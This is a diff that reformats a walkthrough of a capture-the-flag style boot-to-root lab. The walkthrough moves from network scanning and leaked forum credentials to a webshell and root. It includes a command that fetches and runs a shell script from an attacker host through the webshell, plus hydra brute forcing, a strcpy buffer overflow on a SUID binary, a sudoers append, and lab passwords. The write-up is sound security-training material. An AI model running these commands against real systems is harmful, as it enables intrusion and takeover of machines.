@@ -1,32 +1,41 @@
-*INFO GATHERING*
+# 1. INFORMATION GATHERING
 
 As the network config changes depending on the virtualization system used, we start by getting our IP address and scanning the network
 
-```ifconfig```
+```
+ifconfig
+```
 
-```nmap -T4 <Network>```
+```
+nmap -T4 <Network>
+```
 
 ![](./img/01-ifconfig.png)
 ![](./img/02-nmap_network.png)
 
 Thanks to the info obtained, we can test our connectivity to the system and know the target OS based on the TTL
 
-```ping <TargetIP>```
+```
+ping <TargetIP>
+```
 
 ![](./img/03-ping.png)
 
 As the TTL is 64, we can assume that the server is running on Linux. We can proceed with the port scan
 
-```nmap -sV -sC -p- -T4 <TargetIP>```
+```
+nmap -sV -sC -p- -T4 <TargetIP>
+```
 
 ![](./img/04-nmap_target.png)
 
 The interesting open ports found are 21-ftp, 22-ssh, 80-http, 143-imap, 443-https, 993-ssl/imap. After examination, nothing seemed vulnerable in the ftp, http and ssh services.
 
-
 Inspecting the https service, we discovered three different directories
 
-```dirb https://<TargetIP>```
+```
+dirb https://<TargetIP>
+```
 
 ![](./img/05-dirb.png)
 
@@ -36,7 +45,7 @@ In the /forum webpage, we found a list of users as well as some posts. One of th
 
 ![](./img/06-forum_post.png)
 
-*EXPLOITATION*
+# 2. EXPLOITATION
 
 We intuit that the username was in fact a password. As the next succesfull login was done by lmezard, we could login with these credentials.
 
@@ -52,10 +61,11 @@ We can now authenticate in the /phpmyadmin service, gaining access to the DB. As
 
 ![](./img/09-RCE.png)
 
-```https://<TargetIP>/forum/templates_c/rce.php?cmd=curl <AttackerIP>:<HttpPort>/shell.sh | bash```
+```
+https://<TargetIP>/forum/templates_c/rce.php?cmd=curl <AttackerIP>:<HttpPort>/shell.sh | bash
+```
 
-
-*POST EXPLOITATION*
+# 3. POST EXPLOITATION
 
 After some basic local enumeration, we can get the following information:
 - We are indeed in the target system, as the local IP is the same as the target IP
@@ -65,51 +75,77 @@ After some basic local enumeration, we can get the following information:
 
 Reading the file reveals the system credentials for lmezard, although ssh connection is restricted for this user.
 
-```cat /home/LOOKATME/password```
+```
+cat /home/LOOKATME/password
+```
 
-```ssh lmezard@<IP>```
+```
+ssh lmezard@<IP>
+```
 
-```su lmezard```
+```
+su lmezard
+```
 
 ![](./img/10-lmezard.png)
 
-**fun**
+## fun
 
 In lmezard's home directory, we can find a compressed file called "fun" and a README. We download and decompress the file for further analysis.
 
-```nc -nlv <port> > fun``` in attacker
+- In attacker:
 
-```nc <IP> <port> < fun``` in target system
+```
+nc -nlv <port> > fun
+```
 
-```tar -xvf ./fun```
+- In target system:
+
+```
+nc <IP> <port> < fun
+```
+
+```
+tar -xvf ./fun
+```
 
 The README suggests that solving the challenge will allow us access to the user laurie via SSH.
 
 Analyzing fun, we get pieces of information to reconstruct the password. 
 
-```cat ft_fun/* | grep printf | grep -v haha```
+```
+cat ft_fun/* | grep printf | grep -v haha
+```
 
-```cat ft_fun/* | grep getme -A 3 | grep -v haha```
+```
+cat ft_fun/* | grep getme -A 3 | grep -v haha
+```
 
-```cat ft_fun/* | grep return | grep -v haha```
+```
+cat ft_fun/* | grep return | grep -v haha
+```
 
 We deduce that the password lenght is 12, ending with "wnage" and that we need to hash the resulting string before attempting to log in, using SHA256. The characters left to order are "Iepthar".
 
 In order to automate the login attempts, we employed our own password generation script, and hydra, to brute force the attempts. The script generates every possible permutation of the left characters, joins it to the known piece of password, and hashes the result.
 
-```python3 laurie.py | awk '{print $5}' > laurie_passwd.txt```
+```
+python3 laurie.py | awk '{print $5}' > laurie_passwd.txt
+```
 
-```hydra -l laurie -P ./laurie_passwd.txt <TargetIP> ssh -v```
+```
+hydra -l laurie -P ./laurie_passwd.txt <TargetIP> ssh -v
+```
 
 Hydra returns one successful login, using the string "Iheartpwnage", hashed.
 
-**bomb**
+## bomb
 
 The files present in laurie's home directory are a binary executable file called "bomb" and a README, explaining us how to log in as the user thor.
 
 The bomb is a program composed of six levels, each one waiting for the user's input and, in case of error, exploding. The README helps us, giving us some hints and stating that, by joining the inputs used to defuse each phase, we can obtain thor's password.
 
-In order to understand how to solve each level, we decompiled the file using the online service "https://dogbolt.org/".
+In order to understand how to solve each level, we decompiled the file using this online service: https://dogbolt.org/
 
 ***Phases***
 
@@ -129,7 +165,7 @@ In order to understand how to solve each level, we decompiled the file using the
 
 The subject hints that we have to swap the second-to-last and third-to-last characters to form the right password.
 
-- Final password for thor: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+- Final password for thor: ```Publicspeakingisveryeasy.126241207201b2149opekmq426135```
 
 **turtle**
 
@@ -137,15 +173,23 @@ The README file present in thor's home directory tells us to use the result of t
 In "turtle" we find instructions in French seeming to describe a path. Drawing it on paper, we end up writting "SLASH".
 We have to "digest" the password to use it. We therefore apply md5 (message digest) on "SLASH".
 
-```echo -n "SLASH" | md5sum```
+```
+echo -n "SLASH" | md5sum
+```
 
 **buffer overflow**
 
 The directory /home/zaz contains an interesting file, a SUID binary that belongs to root.
 
-```./exploit_me Hello``` (command output)
+```
+./exploit_me Hello
 
-```strings ./exploit_me```
+Hello
+```
+
+```
+strings ./exploit_me
+```
 
 The program prints the argument received. Exploring the readable content of the file reveals the use of the insecure function strcpy. Assuming a buffer being used, we can try to perform a buffer overflow in order to gain root access by executing a shellcode.
 
@@ -158,10 +202,16 @@ The file decompilation supports our idea. The program uses a buffer of 140 bytes
 
 We coded a python script to generate the final payload.
 
-```./exploit_me $(python payload.py)```
+```
+./exploit_me $(python payload.py)
+```
 
-```echo 'zaz ALL=NOPASSWD: ALL' >> /etc/sudoers && sudo su```
+```
+echo 'zaz ALL=NOPASSWD: ALL' >> /etc/sudoers && sudo su
+```
 
-```id```
+```
+id
+```
 
 ![](./img/11-root.png)
